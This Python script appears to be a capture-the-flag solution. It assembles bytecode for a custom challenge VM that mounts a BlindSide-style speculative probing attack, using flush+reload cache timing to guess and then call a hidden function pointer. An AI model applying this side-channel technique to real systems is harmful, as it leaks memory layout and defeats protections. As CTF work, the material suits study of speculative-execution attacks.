#!/usr/bin/env python3

import struct
from itertools import chain

helpers = {
    "nop": 0x11000,
    "print_vm_state": 0x12000,
    "unlock_vm": 0x13000,
    "exit": 0x14000,
    "end": 0x15000,
}

datapage = 0x10000

def conditional(*args):
    for op in args:
        yield 0xF
        yield from op


def emit(opcode, *args):
    yield opcode
    yield from args


def clear():
    return emit(0x0)


def rtdsc():
    return emit(0x1)

def swap_r1():
    return emit(0x2)

def swap_r2():
    return emit(0x3)



def loop_start():
    return emit(0x4)


def big_loop_start():
    return emit(0x5)


def loop_end():
    return emit(0x6)


def big_loop_end():
    return emit(0x7)

def mov_acc_loop():
    return emit(0x8)

def div():
    return emit(0x9)

def enable_fp():
    return emit(0xA)


def disable_fp():
    return emit(0xB)


def call():
    return emit(0xC)


def inc_fp():
    return emit(0xD)

def mfence():
    return emit(0xE)




def set_acc(imm):
    return emit(0x10, imm)


def sub(update_flags=1):
    return emit(0x11, update_flags)

def flush(addr):
    addr = struct.pack(">I", addr)
    return emit(0x12, *addr)


def maccess(addr):
    addr = struct.pack(">I", addr)
    return emit(0x13, *addr)


def set_fp(addr):
    if isinstance(addr, str):
        addr = helpers[addr]

    addr = struct.pack(">I", addr)
    return emit(0x14, *addr)


def loop(*args, **kwargs):
    yield from set_acc(kwargs["times"])
    if "big" in kwargs and kwargs["big"]:
        yield from big_loop_start()
        yield from chain(*args)
        yield from big_loop_end()
    else:
        yield from loop_start()
        yield from chain(*args)
        yield from loop_end()


def assemble(*args):
    return bytes(chain(*args))


def call_fp(fp, acc=None, reg=None):
    if reg is not None:
        yield from set_acc(reg)
        yield from swap_r1()
    yield from set_acc(acc)
    yield from set_fp(fp)
    yield from enable_fp()
    yield from call()


def reload():
    # time at start -> reg
    yield from rtdsc()
    yield from swap_r1()

    yield from maccess(datapage)  # maccess

    # time at end: move it to acc, and sub.
    yield from rtdsc()
    yield from sub()




def do_blindside(guess_start, count, threshold=0x50):

    testing_modulo = 5;

    # set up the function pointers
    # fp 0x0..0xE are nops for training
    yield from loop(
        mov_acc_loop(),
        swap_r1(),
        set_acc(0x01),
        swap_r1(),
        sub(1),
        set_fp("nop"),
        enable_fp(),
        call(),
        times=17,
    )

    # pointer at testing_modula is the guess, but it is disabled
    yield from set_acc(testing_modulo)
    yield from disable_fp()
    yield from set_fp(guess_start)

    # run the blindside
    yield from flush(datapage)  # flush
    yield from loop (
        # init counter for this run:
        flush(datapage),
        set_acc(0xff),
        swap_r2(),

        # probing loop
        loop(


            # set the right index to be called
            mov_acc_loop(),
            set_acc(0x10),
            swap_r1(),

            div(),
            swap_r1(),
            flush(datapage),
            mfence(),

            call(),

            # f+r if we had one of our testing payloads
            mov_acc_loop(),
            set_acc(0x10),
            swap_r1(),
            div(),
            set_acc(testing_modulo),
            swap_r1(),
            sub(1),


            # inline reload for conditional
            conditional(
                rtdsc(),
                swap_r1(),

                maccess(datapage),  # maccess

                rtdsc(),
                sub(0),
                swap_r1(),
                set_acc(threshold),
                swap_r1(),

                # substract success threshold.
                # If successful, we are still in conditional mode
                sub(1),

                # dec counter
                swap_r2(),
                swap_r1(),
                set_acc(1),
                swap_r1(),

                sub(0),

                # mov counter back to r2
                swap_r2(),

            ),
            # check if we hit enough speculations (counter == 0)
            swap_r2(),
            swap_r1(),
            set_acc(0x00),
            swap_r1(),
            sub(1),

            # Yes! Let's call to victory
            conditional(
                set_acc(testing_modulo),
                enable_fp(),
                call(),
                disable_fp(),
            ),



            swap_r1(),
            swap_r1(),
            swap_r2(),

            times=3,
            big=True
        ),

        set_acc(testing_modulo),
        inc_fp(),
        times = 0
    )


if __name__ == "__main__":


    bytecode = assemble(
        call_fp("unlock_vm", acc=0x13, reg=0x37),
        loop(
        call_fp("print_vm_state", acc=0, reg=0x37),
            times=2,
            #big=True
        ),
        #call_fp("exit", acc=0x10, reg=0x37),
        do_blindside(0x19000, 2),
    )

    bytecode = assemble(
        # verify timing difference works
            flush(datapage),
            reload(),
            swap_r1(),
            call_fp("print_vm_state", acc=0x0),
            maccess(datapage),
            reload(),
            call_fp("print_vm_state", acc=0x0),
            swap_r1(),
            set_acc(0xff),
        # solve challenge
        call_fp("unlock_vm", acc=0x13, reg=0x37),
        do_blindside(0x18000, 0x1),
    )

    import sys

    sys.stdout.buffer.write(bytecode)
